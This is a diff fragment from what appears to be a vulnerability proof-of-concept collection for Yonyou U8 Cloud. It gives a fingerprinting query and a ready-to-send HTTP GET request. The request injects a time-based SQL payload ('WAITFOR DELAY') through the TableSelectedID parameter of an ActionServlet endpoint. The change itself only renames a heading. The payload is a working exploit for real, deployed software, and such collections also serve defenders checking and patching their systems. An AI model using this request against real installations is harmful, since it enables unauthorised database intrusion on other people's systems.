@@ -8,7 +8,7 @@
 app="用友-U8-Cloud"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasQueryConditionFrameAction&method=doCopy&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:5%27--+ HTTP/1.1
